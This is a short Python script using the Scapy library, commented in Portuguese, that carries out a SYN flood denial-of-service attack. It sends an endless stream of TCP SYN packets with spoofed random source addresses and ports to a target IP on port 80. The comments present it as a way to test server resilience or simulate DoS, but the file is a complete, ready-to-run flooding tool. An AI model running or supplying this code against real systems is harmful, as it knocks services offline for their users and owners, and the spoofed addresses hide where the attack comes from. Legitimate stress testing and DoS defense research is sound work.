# SYN Flood Attack (DoS)
# Envia milhares de pacotes TCP SYN com IPs e portas falsos para travar o alvo.
# 👉 Uso real: Testar resistência de servidores ou simular ataque DoS.


from scapy.all import *

target = "192.168.1.1"

while True:
    pkt = IP(dst=target, src=RandIP()) / TCP(sport=RandShort(), dport=80, flags="S")
    send(pkt, verbose=0)
